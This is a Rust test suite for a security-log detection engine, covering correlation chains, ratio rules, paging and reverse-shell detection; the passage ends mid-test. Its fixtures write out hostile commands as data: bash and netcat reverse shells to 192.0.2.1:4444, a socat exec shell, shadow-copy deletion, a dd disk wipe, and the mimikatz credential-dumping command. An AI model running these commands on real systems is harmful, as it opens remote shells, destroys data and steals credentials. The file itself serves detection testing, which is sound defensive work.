use crate::{
    detections::{self, Settings, Source, Triage},
    model::Event,
};
use serde_json::{json, Value};

fn event(id: usize, seconds: i64, fields: Value) -> Event {
    let mut e = Event::empty();
    e.id = id;
    e.timestamp = Some(1_700_000_000_000 + seconds * 1000);
    e.source = "contract-test".into();
    e.fields = fields.as_object().unwrap().clone();
    e
}
fn process(id: usize, seconds: i64, command: &str) -> Event {
    event(
        id,
        seconds,
        json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.entity_id":format!("p{id}"),"process.command_line":command}),
    )
}
fn run(events: &[Event]) -> Triage {
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats: false, ..Default::default() };
    detections::run(
        &detections::Inputs { rules: &rules, settings: &settings, catalog: None },
        &Source::Events(events.iter().collect()),
    )
    .unwrap()
}
fn contains(t: &Triage, rule: &str) -> bool {
    t.detections.iter().any(|d| d.rule == rule)
}
fn custom(rule: Value, events: &[Event], settings: &Settings) -> Triage {
    let rules = detections::test_ruleset(vec![serde_json::from_value(rule).unwrap()], vec![]).unwrap();
    detections::run(
        &detections::Inputs { rules: &rules, settings, catalog: None },
        &Source::Events(events.iter().collect()),
    )
    .unwrap()
}

#[test]
fn security_ratio_and_numeric_aggregates_use_full_denominator() {
    let ratio = json!({"id":"ratio-test","name":"Proporção em autenticação direcionada","severity":"high","kind":"ratio","where":"_sec.action:logon","by":["_sec.host"],"window":"5m","count":4,"ratio":{"numerator":"_sec.outcome:failure","gte":0.75},"evidence":{"level":2,"rationale":"Falhas predominantes no contexto declarado","maturity":"experimental"}});
    let mut events:Vec<_>=(0..4).map(|i|event(i,i as i64,json!({"event.category":"authentication","event.action":"logon","event.outcome":if i<3{"failure"}else{"success"},"host.name":"h"}))).collect();
    let settings = Settings { threats: false, ..Default::default() };
    let r = custom(ratio.clone(), &events, &settings);
    assert_eq!(r.detections[0].measurements["numerator"], 3);
    assert_eq!(r.detections[0].measurements["denominator"], 4);
    events[0].fields.insert("event.outcome".into(), json!("success"));
    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
    events[0].fields.insert("event.outcome".into(), json!("failure"));
    events[3].timestamp = events[0].timestamp.map(|t| t + 300001);
    assert!(custom(ratio.clone(), &events, &settings).detections.is_empty());
    let boundary = (events[0].timestamp.unwrap().div_euclid(300000) + 1) * 300000;
    let mut straddled = Vec::new();
    for i in 0..14 {
        let mut e = events[0].clone();
        e.id = i;
        e.timestamp = Some(boundary + i as i64 - 10);
        e.fields.insert("event.outcome".into(), json!(if i < 10 { "success" } else { "failure" }));
        straddled.push(e);
    }
    assert!(
        custom(ratio.clone(), &straddled, &settings).detections.is_empty(),
        "Partition boundary must retain successful events in denominator"
    );
    for e in &mut straddled {
        e.timestamp = Some(boundary);
    }
    assert!(
        custom(ratio, &straddled, &settings).detections.is_empty(),
        "Equal timestamps cannot be evaluated using an arbitrary prefix"
    );
    let aggregate = json!({"id":"aggregate-test","name":"Volume em transferência sensível","severity":"high","kind":"aggregate","where":"_sec.action:object_transfer","by":["_sec.host"],"window":"5m","count":2,"aggregate":{"field":"bytes","operation":"sum","gte":100},"evidence":{"level":2,"rationale":"Transferência previamente selecionada como sensível","maturity":"experimental"}});
    let events = vec![
        event(0, 0, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":40})),
        event(1, 1, json!({"event.category":"network","event.action":"object_transfer","host.name":"h","bytes":60})),
    ];
    let r = custom(aggregate.clone(), &events, &settings);
    assert_eq!(r.detections[0].measurements["value"], 100.0);
    let mut average = aggregate.clone();
    average["aggregate"] = json!({"field":"bytes","operation":"avg","gte":10});
    let averages: Vec<_> = [10, 10, -100, 100, 10, 10]
        .iter()
        .enumerate()
        .map(|(i, n)| {
            let mut e = events[0].clone();
            e.id = i;
            e.timestamp = e.timestamp.map(|t| t + i as i64);
            e.fields.insert("bytes".into(), json!(n));
            e
        })
        .collect();
    assert_eq!(
        custom(average, &averages, &settings).detections.len(),
        1,
        "Do not reset the denominator after emitting a finding"
    );
    let mut missing = events;
    missing[0].fields.remove("bytes");
    assert!(custom(aggregate, &missing, &settings).detections.is_empty());
}

#[test]
fn security_absence_requires_complete_explicit_source_coverage() {
    let rule = json!({"id":"absence-test","name":"Operação suspeita sem evento esperado","severity":"medium","kind":"absence","by":["_sec.host"],"window":"5m","coverage":"process","steps":[{"where":"phase:anchor"},{"where":"phase:expected"}],"evidence":{"level":2,"rationale":"Âncora suspeita explicitamente selecionada","maturity":"experimental"}});
    let mut anchor = process(0, 0, "whoami");
    anchor.fields.insert("phase".into(), json!("anchor"));
    let mut settings = Settings { threats: false, ..Default::default() };
    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
    let fingerprint = custom(rule.clone(), &[anchor.clone()], &settings).dataset_fingerprint;
    settings.coverage.push(detections::CoverageWindow {
        dataset_fingerprint: fingerprint,
        source: anchor.source.clone(),
        namespace: "host:h".into(),
        category: "process".into(),
        start: anchor.timestamp.unwrap(),
        end: anchor.timestamp.unwrap() + 300000,
        complete: true,
        justification: "Intervalo integral exportado do sensor".into(),
    });
    let r = custom(rule.clone(), &[anchor.clone()], &settings);
    assert_eq!(r.detections.len(), 1);
    assert_eq!(r.detections[0].measurements["expected_events"], 0);
    let mut expected = process(1, 300, "whoami");
    expected.fields.insert("phase".into(), json!("expected"));
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
    expected.timestamp = None;
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(custom(rule.clone(), &[anchor.clone(), expected.clone()], &settings).detections.is_empty());
    expected.fields.remove("host.name");
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone(), expected.clone()], &Settings::default()).dataset_fingerprint;
    assert!(
        custom(rule.clone(), &[anchor.clone(), expected], &settings).detections.is_empty(),
        "Unjoinable expected event prevents an absence claim"
    );
    settings.coverage[0].dataset_fingerprint =
        custom(rule.clone(), &[anchor.clone()], &Settings::default()).dataset_fingerprint;
    settings.coverage[0].end -= 1;
    assert!(custom(rule.clone(), &[anchor.clone()], &settings).detections.is_empty());
    settings.coverage[0].end += 1;
    settings.coverage[0].source = "another-source".into();
    assert!(custom(rule, &[anchor], &settings).detections.is_empty());
}

#[test]
fn security_disk_pages_preserve_levels_members_and_universe() {
    let events = chains().remove(0).1;
    let rules = detections::builtin_ruleset().unwrap();
    let settings = Settings { threats: false, ..Default::default() };
    let inputs = detections::Inputs { rules: &rules, settings: &settings, catalog: None };
    let in_memory = detections::run(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let stored = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
    let page = stored.page(1, 0, 1, None, None).unwrap();
    assert_eq!(page["counts_by_level"], json!(in_memory.counts_by_level));
    assert_eq!(page["analysis_id"], in_memory.analysis_id);
    for d in page["detections"].as_array().unwrap() {
        let original = in_memory.detections.iter().find(|x| x.id == d["id"]).unwrap();
        assert_eq!(d["evidence_level"], original.evidence.evidence_level);
        assert_eq!(d["event_refs"], json!(original.evidence.event_refs));
    }
    let id = page["episodes"][0]["id"].as_str().unwrap();
    assert!(in_memory.episodes.iter().any(|e| e.id == id));
    let mut all = Vec::new();
    let mut offset = 0;
    loop {
        let p = stored.episode_members(id, offset, 1).unwrap();
        all.extend(p["detections"].as_array().unwrap().clone());
        match p["next_offset"].as_u64() {
            Some(n) => offset = n as usize,
            None => break,
        }
    }
    assert_eq!(all.len(), page["episodes"][0]["detection_count"].as_u64().unwrap() as usize);
    let mut related = std::iter::once(events[1].id);
    let narrow = stored.page(5, 0, 1, Some(&mut related), None).unwrap();
    assert_eq!(narrow["analysis_id"], page["analysis_id"]);
    assert_eq!(narrow["episodes"][0]["id"], page["episodes"][0]["id"]);
}

#[test]
fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
    let mut meta = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")]);
    let template = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
    meta.detections.clear();
    meta.episodes.clear();
    let mut writer = crate::security_results::Writer::new().unwrap();
    let mut unassessed = template.clone();
    unassessed.id = "unassessed".into();
    unassessed.evidence.evidence_level = 0;
    for i in 0..205 {
        let mut member = template.evidence.evidence_members[0].clone();
        member.event_id = i + 1;
        member.event_ref = format!("member-{i:03}");
        unassessed.event_ids.push(i + 1);
        unassessed.evidence.event_refs.push(member.event_ref.clone());
        unassessed.evidence.evidence_members.push(member);
    }
    writer.push(&unassessed).unwrap();
    for i in 0..205 {
        let mut d = template.clone();
        d.id = format!("finding-{i:03}");
        d.evidence.evidence_level = if i == 204 { 1 } else { 5 };
        let mut member = d.evidence.evidence_members[0].clone();
        member.event_id = i + 1;
        member.event_ref = format!("member-{i:03}");
        d.event_ids.push(i + 1);
        d.evidence.event_refs.push(member.event_ref.clone());
        d.evidence.evidence_members.push(member);
        writer.push(&d).unwrap();
    }
    let stored = writer.finish(meta).unwrap();
    let mut ids = std::iter::once(205);
    let page = stored.page(1, 0, 20, Some(&mut ids), None).unwrap();
    assert_eq!(page["visible_detections"], 1);
    assert_eq!(page["detections"][0]["id"], "finding-204");
    assert_eq!(page["detections"][0]["context_only"], false);
    assert_eq!(page["episodes"][0]["members_complete"], false);
    let id = page["episodes"][0]["id"].as_str().unwrap();
    let mut found = std::collections::HashSet::new();
    let mut offset = 0;
    loop {
        let members = stored.episode_members(id, offset, 100).unwrap();
        for d in members["detections"].as_array().unwrap() {
            assert!(found.insert(d["id"].as_str().unwrap().to_string()));
        }
        match members["next_offset"].as_u64() {
            Some(n) => offset = n as usize,
            None => break,
        }
    }
    assert_eq!(found.len(), 205);
    let at = template.start.unwrap();
    let timeline = stored.timeline(1, at - 1, at + 1, None).unwrap();
    assert_eq!(timeline["count"], 205);
    assert_eq!(stored.timeline(5, at - 1, at + 1, None).unwrap()["count"], 204);
    let mut ids = std::iter::once(205);
    assert_eq!(stored.timeline(1, at - 1, at + 1, Some(&mut ids)).unwrap()["count"], 1);
    let mut ids = std::iter::once(205);
    assert_eq!(stored.page(5, 0, 20, Some(&mut ids), None).unwrap()["visible_detections"], 0);
}

#[test]
#[ignore = "Disk result benchmark; RESULT_FINDINGS defaults to 100001, exceeds old output limits"]
fn benchmark_security_result_store() {
    let count = std::env::var("RESULT_FINDINGS").ok().and_then(|s| s.parse::<usize>().ok()).unwrap_or(100001);
    let events = vec![process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")];
    let mut meta = run(&events);
    let mut d = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
    meta.detections.clear();
    meta.episodes.clear();
    meta.entities.clear();
    meta.total = count;
    let start = std::time::Instant::now();
    let working = crate::security_store::working_lane();
    let mut writer = crate::security_results::Writer::new().unwrap();
    for i in 0..count {
        let reference = format!("volume-event-{i:09}");
        d.id = format!("volume-finding-{i:09}");
        d.event_ids = vec![i];
        d.evidence.event_refs = vec![reference.clone()];
        d.evidence.evidence_members[0].event_ref = reference;
        d.evidence.evidence_members[0].event_id = i;
        writer.push(&d).unwrap();
    }
    let result = writer.finish(meta).unwrap();
    drop(working);
    let analysis_ms = start.elapsed().as_millis();
    let first = result.page(5, 0, 20, None, None).unwrap();
    let last = result.page(5, count - 1, 20, None, None).unwrap();
    assert_eq!(first["visible_detections"], count);
    assert_eq!(last["detections"].as_array().unwrap().len(), 1);
    assert_eq!(result.related(&format!("volume-event-{:09}", count - 1)).unwrap()[0]["event_ids"][0], count - 1);
    let mut all = std::collections::HashSet::new();
    for page in [first, last] {
        for d in page["detections"].as_array().unwrap() {
            assert!(all.insert(d["id"].as_str().unwrap().to_string()));
        }
    }
    println!(
        "RESULT_STORE_BENCH {}",
        json!({"findings":count,"analysis_ms":analysis_ms,"memory":result.metadata["memory"],"first_and_last_page":true,"no_global_count_or_output_cut":true})
    );
}
fn chains() -> Vec<(&'static str, Vec<Event>)> {
    let command = "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1";
    let web = vec![
        event(
            0,
            0,
            json!({"event.category":"web","event.action":"http_request","event.outcome":"success","http.request.method":"POST","host.name":"h","service.name":"web","request.id":"r1","http.request.body.command":command}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","service.name":"web","request.id":"r1","process.command_line":command}),
        ),
    ];
    let download = vec![
        event(
            0,
            0,
            json!({"event.category":"file","event.action":"file_create","event.outcome":"success","host.name":"h","file.path":"/tmp/payload","download.url":"https://example.invalid/a","process.entity_id":"down"}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.executable":"/tmp/payload","process.parent.entity_id":"down","process.command_line":command}),
        ),
    ];
    let cloud = vec![
        event(
            0,
            0,
            json!({"eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","userIdentity.accountId":"a","responseElements.accessKey.accessKeyId":"new-key"}),
        ),
        event(
            1,
            1,
            json!({"eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging","userIdentity.accountId":"a","userIdentity.accessKeyId":"new-key"}),
        ),
        event(
            2,
            2,
            json!({"eventSource":"secretsmanager.amazonaws.com","eventName":"GetSecretValue","userIdentity.accountId":"a","userIdentity.accessKeyId":"new-key"}),
        ),
    ];
    let persistence = vec![
        event(
            0,
            0,
            json!({"event.category":"configuration","event.action":"service_install","event.outcome":"success","host.name":"h","service.executable":"/tmp/payload"}),
        ),
        event(
            1,
            1,
            json!({"event.category":"process","event.action":"process_start","event.outcome":"success","host.name":"h","process.executable":"/tmp/payload","process.command_line":command}),
        ),
    ];
    let mut recovery =
        vec![process(0, 0, "vssadmin delete shadows /all /quiet"), process(1, 1, "dd if=/dev/zero of=/dev/sda")];
    for e in &mut recovery {
        e.fields.insert("process.parent.entity_id".into(), json!("same-parent-instance"));
    }
    vec![
        ("chain.web.command", web),
        ("chain.download.execution", download),
        ("chain.cloud.credential", cloud),
        ("chain.persistence.payload", persistence),
        ("chain.recovery.destruction", recovery),
    ]
}

#[test]
fn security_five_reference_correlations_require_every_stage_and_relation() {
    for (rule, events) in chains() {
        let result = run(&events);
        let d =
            result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| {
                panic!("{rule}: {:?}", result.detections.iter().map(|d| &d.rule).collect::<Vec<_>>())
            });
        assert_eq!(
            d.evidence.evidence_level,
            if ["chain.recovery.destruction", "chain.cloud.credential"].contains(&rule) { 4 } else { 5 },
            "{rule}"
        );
        assert_eq!(d.event_ids.len(), events.len());
        assert!(!d.evidence.relationships.is_empty());
        for missing in 0..events.len() {
            let mut less = events.clone();
            less.remove(missing);
            assert!(!contains(&run(&less), rule), "{rule} accepted missing step {missing}");
        }
        let mut late = events.clone();
        late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
        assert!(!contains(&run(&late), rule), "{rule} ignored window");
        let mut reversed = events.clone();
        reversed[0].timestamp = Some(events.last().unwrap().timestamp.unwrap() + 1000);
        assert!(!contains(&run(&reversed), rule), "{rule} ignored order");
        let mut blocked = events.clone();
        let last = blocked.last_mut().unwrap();
        last.fields.insert("event.outcome".into(), json!("failure"));
        last.fields.insert("errorCode".into(), json!("AccessDenied"));
        assert!(!contains(&run(&blocked), rule), "{rule} accepted denial");
    }
}

#[test]
fn security_rigidity_is_cumulative_and_does_not_reclassify_or_change_ids() {
    let (_, events) = chains().remove(0);
    let mut full = serde_json::to_value(run(&events)).unwrap();
    // An independently validated rule can occupy E5; this fixture tests projection, not accuracy.
    full["detections"][0]["evidence_level"] = json!(5);
    full["episodes"][0]["evidence_level"] = json!(5);
    let mut previous = std::collections::HashSet::new();
    for level in (1..=5).rev() {
        let selected = crate::triage::project(&full, level, None);
        let ids: std::collections::HashSet<_> = selected["detections"]
            .as_array()
            .unwrap()
            .iter()
            .filter(|d| d["context_only"] != true)
            .map(|d| d["id"].as_str().unwrap().to_string())
            .collect();
        assert!(previous.is_subset(&ids));
        previous = ids;
        for d in selected["detections"].as_array().unwrap() {
            let original = full["detections"].as_array().unwrap().iter().find(|old| old["id"] == d["id"]).unwrap();
            for field in ["evidence_level", "event_refs", "relationships", "evidence_members"] {
                assert_eq!(d[field], original[field]);
            }
            if d["context_only"] != true {
                assert!(d["evidence_level"].as_u64().unwrap() >= level as u64);
            }
        }
    }
}

#[test]
fn security_e5_claim_does_not_promote_context_components() {
    for (_, events) in chains() {
        let result = run(&events);
        let originals: std::collections::HashMap<_, _> =
            result.detections.iter().map(|d| (d.id.clone(), d.evidence.evidence_level)).collect();
        let full = serde_json::to_value(result).unwrap();
        for d in crate::triage::project(&full, 5, None)["detections"].as_array().unwrap() {
            assert_eq!(d["evidence_level"], originals[d["id"].as_str().unwrap()]);
        }
    }
}

#[test]
fn security_advanced_chains_require_real_bindings_and_all_stages() {
    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-advanced-validation.json")).unwrap();
    for f in corpus["fixtures"].as_array().unwrap() {
        let rule = f["rule"].as_str().unwrap();
        let events: Vec<_> = f["events"]
            .as_array()
            .unwrap()
            .iter()
            .enumerate()
            .map(|(i, fields)| event(i, i as i64, fields.clone()))
            .collect();
        let result = run(&events);
        let d = result.detections.iter().find(|d| d.rule == rule).unwrap_or_else(|| panic!("missing {rule}"));
        assert_eq!(d.evidence.evidence_level as u64, f["level"].as_u64().unwrap(), "{rule}");
        if events.len() > 1 {
            for remove in 0..events.len() {
                let mut less = events.clone();
                less.remove(remove);
                assert!(!contains(&run(&less), rule), "missing stage: {rule}");
            }
            let mut tenant = events.clone();
            tenant.last_mut().unwrap().fields.insert("organization.id".into(), json!("other-tenant"));
            assert!(!contains(&run(&tenant), rule), "tenant: {rule}");
            let mut denied = events.clone();
            denied.last_mut().unwrap().fields.insert("event.outcome".into(), json!("blocked"));
            assert!(!contains(&run(&denied), rule), "denied: {rule}");
            let mut late = events.clone();
            late.last_mut().unwrap().timestamp = Some(events[0].timestamp.unwrap() + 86_400_001);
            assert!(!contains(&run(&late), rule), "late: {rule}");
        }
        for field in ["artifact.sha256", "pipeline.run.id"] {
            if events.len() > 2 && events.last().unwrap().fields.contains_key(field) {
                let mut changed = events.clone();
                changed.last_mut().unwrap().fields.insert(field.into(), json!("another"));
                assert!(!contains(&run(&changed), rule), "binding {field}: {rule}");
            }
        }
    }
}

#[test]
fn security_reverse_shell_is_e5_even_blocked_but_not_quoted_or_probe() {
    for outcome in ["success", "blocked", "failure", "unknown"] {
        let e = event(
            0,
            0,
            json!({"event.category":"web","event.action":"http_request","http.request.method":"POST","http.request.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1","event.outcome":outcome}),
        );
        let r = run(&[e]);
        let d = r.detections.iter().find(|d| d.rule == "attempt.reverse-shell.request").unwrap();
        assert_eq!(d.evidence.evidence_level, 5);
        assert_eq!(d.evidence.outcome, outcome);
        assert_eq!(d.evidence.claim, "attempt");
    }
    for command in [
        "echo 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "echo bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "logger 'example; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "echo docs # ; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "cat <<EOF\nbash -i >& /dev/tcp/192.0.2.1/4444 0>&1\nEOF",
        "python -c 'print(\"socket.socket( .connect(( dup2( pty.spawn( /bin/sh\")'",
        "echo probe > /dev/tcp/192.0.2.1/443",
        "nc example.invalid 443",
        "bash -i",
        "nc -e /bin/sh",
    ] {
        let r = run(&[process(0, 0, command)]);
        assert!(!contains(&r, "attempt.reverse-shell.process"), "{command}");
    }
    for command in [
        "echo ready; bash -i >& /dev/tcp/192.0.2.1/4444 0>&1",
        "bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'",
        "nc 192.0.2.1 4444 -e /bin/sh",
        "socat tcp:192.0.2.1:4444 exec:/bin/sh",
    ] {
        assert!(contains(&run(&[process(0, 0, command)]), "attempt.reverse-shell.process"), "{command}");
    }
    let mut quoted = process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1");
    quoted.fields.insert("event.kind".into(), json!("documentation"));
    assert!(!contains(&run(&[quoted]), "attempt.reverse-shell.process"));
    let uri = event(
        0,
        0,
        json!({"http.request.method":"GET","url.full":"/run?cmd=bash+-i+%3E%26+/dev/tcp/192.0.2.1/4444+0%3E%261","event.action":"http_request","event.outcome":"blocked"}),
    );
    assert!(contains(&run(&[uri]), "attempt.reverse-shell.request"));
    let response = event(
        0,
        0,
        json!({"http.request.method":"GET","event.action":"http_request","http.response.body.command":"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1"}),
    );
    assert!(!contains(&run(&[response]), "attempt.reverse-shell.request"));
}

#[test]
fn security_expansion_positive_and_administrative_negative_pairs() {
    let corpus: Value = serde_json::from_str(include_str!("../resources/detection-validation.json")).unwrap();
    for fixture in corpus["fixtures"].as_array().unwrap() {
        let rule = fixture["rule"].as_str().unwrap();
        assert!(contains(&run(&[event(0, 0, fixture["positive"].clone())]), rule), "positive {rule}");
        assert!(!contains(&run(&[event(0, 0, fixture["negative"].clone())]), rule), "administrative negative {rule}");
    }
}

#[test]
fn security_array_fields_must_belong_to_the_same_object() {
    let e = event(
        0,
        0,
        json!({"eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy","userIdentity.accountId":"1","requestParameters.policy":{"Statement":[{"Effect":"Allow","Principal":"specific-principal","Action":"s3:GetObject","Resource":"arn:aws:s3:::a/*"},{"Effect":"Deny","Principal":"*","Action":"s3:GetObject","Resource":"arn:aws:s3:::a/*"}]}}),
    );
    assert!(!contains(&run(&[e]), "cloud.s3-public-read"));
}

#[test]
fn security_tenant_request_process_and_time_boundaries() {
    let (web, events) = chains().remove(0);
    for field in ["host.name", "service.name", "request.id"] {
        let mut changed = events.clone();
        changed[1].fields.insert(field.into(), json!("different"));
        assert!(!contains(&run(&changed), web), "unsafe join {field}");
    }
    let mut equal = events.clone();
    equal[1].timestamp = equal[0].timestamp;
    assert!(!contains(&run(&equal), web));
    let mut edge = events.clone();
    edge[1].timestamp = Some(edge[0].timestamp.unwrap() + 300_000);
    assert!(contains(&run(&edge), web));
    edge[1].timestamp = Some(edge[0].timestamp.unwrap() + 300_001);
    assert!(!contains(&run(&edge), web));
    let (cloud, mut tenant) = chains().remove(2);
    tenant[2].fields.insert("userIdentity.accountId".into(), json!("other"));
    assert!(!contains(&run(&tenant), cloud));
    let (download, mut pids) = chains().remove(1);
    pids[1].fields.remove("process.parent.entity_id");
    pids[1].fields.insert("process.parent.pid".into(), json!(42));
    assert!(!contains(&run(&pids), download));
}

#[test]
fn security_duplicates_do_not_promote_or_supply_missing_steps() {
    let (rule, mut events) = chains().remove(2);
    for (i, e) in events.iter_mut().enumerate() {
        e.fields.insert("eventID".into(), json!(format!("operation-{i}")));
    }
    let before = run(&events);
    let mut duplicate = events[1].clone();
    duplicate.id = 3;
    events.push(duplicate);
    let after = run(&events);
    assert_eq!(after.duplicates, 1);
    let a = before.detections.iter().find(|d| d.rule == rule).unwrap();
    let b = after.detections.iter().find(|d| d.rule == rule).unwrap();
    assert_eq!((a.id.as_str(), a.evidence.evidence_level), (b.id.as_str(), b.evidence.evidence_level));
    events.remove(2);
    assert!(!contains(&run(&events), rule));
}

#[test]
fn security_ordinary_tools_and_critical_severity_are_not_evidence() {
    for command in [
        "powershell -NoProfile -Command Get-Date",
        "curl https://example.org",
        "ssh admin@example.org",
        "regsvr32 app.dll",
        "msbuild app.csproj",
        "whoami",
        "admin error shell password",
    ] {
        let mut e = process(0, 0, command);
        e.level = "Crítico".into();
        assert!(run(&[e]).detections.is_empty(), "ordinary command: {command}");
    }
}

#[test]
fn security_http_is_not_authentication_and_enrichment_is_not_execution() {
    let mut e =
        event(0, 0, json!({"http.request.method":"POST","url.original":"/login","http.response.status_code":200}));
    assert_ne!(crate::entities::action_outcome(&e).0, Some("logon"));
    e.name = "mimikatz".into();
    e.description = "bash -i /dev/tcp/192.0.2.1/4444".into();
    assert!(crate::threats::builtin_catalog().event_hits(&e).is_empty());
    assert!(run(&[e]).detections.is_empty());
}

#[test]
fn security_fragment_reconstruction_and_original_references() {
    let mut first = event(
        0,
        0,
        json!({"Computer":"h","ScriptBlockId":"s","MessageNumber":1,"MessageTotal":2,"ScriptBlockText":"bash -i >& /dev/"}),
    );
    first.source = "Microsoft-Windows-PowerShell".into();
    first.code = "4104".into();
    let mut last = first.clone();
    last.id = 1;
    last.fields.insert("MessageNumber".into(), json!(2));
    last.fields.insert("ScriptBlockText".into(), json!("tcp/192.0.2.1/4444 0>&1"));
    let result = run(&[first.clone(), last.clone()]);
    let d = result.detections.iter().find(|d| d.rule == "c2.reverse-shell").expect("reassembled script");
    assert_eq!(d.event_ids, vec![0, 1]);
    assert_eq!(d.evidence.event_refs.len(), 2);
    let partial = crate::security_reconstruct::assemble(vec![first]).unwrap();
    assert!(!partial.limitations.is_empty());
}

#[test]
fn security_mapping_precedence_conflicts_and_provenance() {
    let mut e = process(0, 0, "curl https://example.org");
    e.fields.insert("custom_outcome".into(), json!("denied"));
    let mapping: crate::security_normalize::SourceMapping = serde_json::from_value(
        json!({"source":"contract-test","fields":{"outcome":"custom_outcome"},"outcomes":{"denied":"failure"}}),
    )
    .unwrap();
    let (_, normal) = crate::security_normalize::normalize(&e, &[mapping]);
    assert_eq!(normal.get("outcome"), Some("success"));
    assert!(!normal.conflicts.is_empty());
    assert!(!normal.values["command"].field.is_empty());
}

#[test]
fn security_exact_evidence_filters_and_context_outside_cut() {
    let (_, events) = chains().remove(0);
    let full = run(&events);
    let d = full.detections.iter().find(|d| d.rule == "chain.web.command").unwrap();
    let prepared = crate::query::prepare(&d.filters);
    assert!(events.iter().all(|e| prepared.iter().all(|f| crate::query::matches(e, f))));
    let unrelated = process(42, 0, "whoami");
    assert!(!prepared.iter().all(|f| crate::query::matches(&unrelated, f)));
    let value = serde_json::to_value(full).unwrap();
    let ids = std::collections::HashSet::from([1]);
    let selected = crate::triage::project(&value, 4, Some(&ids));
    assert_eq!(
        selected["detections"].as_array().unwrap().iter().find(|d| d["rule"] == "chain.web.command").unwrap()
            ["event_ids"]
            .as_array()
            .unwrap()
            .len(),
        2
    );
}

#[test]
fn security_catalog_requires_reviewed_suspicion_and_never_tool_or_error_alone() {
    let rules = detections::builtin_ruleset().unwrap();
    let catalog = crate::threats::builtin_catalog();
    let settings = Settings::default();
    let input = detections::Inputs { rules: &rules, catalog: Some(&catalog), settings: &settings };
    for text in [
        "aws iam create-access-key",
        "aws s3 sync ./backup s3://backup",
        "powershell -enc RwBlAHQALQBEAGEAdABlAA==",
        "rclone copy ./backup remote:backup",
        "You have an error in your SQL syntax",
        "PSEXESVC.exe",
    ] {
        assert!(
            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
            "{text}"
        );
    }
    for text in ["echo 'sekurlsa::logonpasswords'", "Write-Output 'bash -i /dev/tcp/192.0.2.1/4'"] {
        assert!(
            detections::run(&input, &Source::Events(vec![&process(0, 0, text)])).unwrap().detections.is_empty(),
            "quoted: {text}"
        );
    }
    let mut documentation = process(0, 0, "sekurlsa::logonpasswords");
    documentation.fields.insert("event.kind".into(), json!("documentation"));
    assert!(detections::run(&input, &Source::Events(vec![&documentation])).unwrap().detections.is_empty());
}

#[test]
fn security_more_than_five_hundred_findings_do_not_cut_later_correlations() {
    let mut events: Vec<_> = (0..510).map(|id| process(id, id as i64, "sekurlsa::logonpasswords")).collect();
    let (rule, mut chain) = chains().remove(0);
    for e in &mut chain {
        e.id += events.len();
    }
    events.extend(chain);
    let result = run(&events);
    assert!(result.detections.len() > 500);
    assert!(contains(&result, rule));
}

#[test]
fn security_object_names_blocked_outcomes_and_namespace_are_exact() {
    let expr = crate::querylang::compile_rule("Name:ForwardTo Value:/@/").unwrap();
    assert!(expr.matches_object(json!({"Name":"ForwardTo","Value":"a@example.org"}).as_object().unwrap()));
    let mut blocked = process(0, 0, "sekurlsa::logonpasswords");
    blocked.fields.insert("event.outcome".into(), json!("blocked"));
    let (_, normalized) = crate::security_normalize::normalize(&blocked, &[]);
    assert_eq!(normalized.get("outcome"), Some("blocked"));
    let mut a = process(1, 0, "sekurlsa::logonpasswords");
    a.fields.insert("user.name".into(), json!("same"));
    a.fields.insert("user.domain".into(), json!("tenant-a"));
    let mut b = a.clone();
    b.id = 2;
    b.fields.insert("user.domain".into(), json!("tenant-b"));
    let result = run(&[a, b]);
    let entities: Vec<_> = result.entities.iter().filter(|e| e.column == "@user" && e.value == "same").collect();
    assert_eq!(entities.len(), 2);
    assert_ne!(entities[0].namespace, entities[1].namespace);
    assert_ne!(run(&[process(1, 0, "whoami")]).analysis_id, run(&[process(2, 0, "whoami")]).analysis_id);
}

#[test]
fn security_sigma_correlations_aliases_distinct_order_and_fail_closed() {
    let base = r#"
title: Created
name: created
logsource: {category: process_creation}
detection:
  selection: {stage: created}
  condition: selection
---
title: Used
name: used
logsource: {category: process_creation}
detection:
  selection: {stage: used}
  condition: selection
---
title: Correlation
id: chain
x-loginsight-evidence: {level: 3, rationale: "Specific test relation", maturity: experimental}
correlation:
  type: temporal_ordered
  rules: [created, used]
  group-by: [object]
  aliases:
    object: {created: created_id, used: used_id}
  timespan: 5m
"#;
    let evaluate = |yaml: &str, events: &[Event]| {
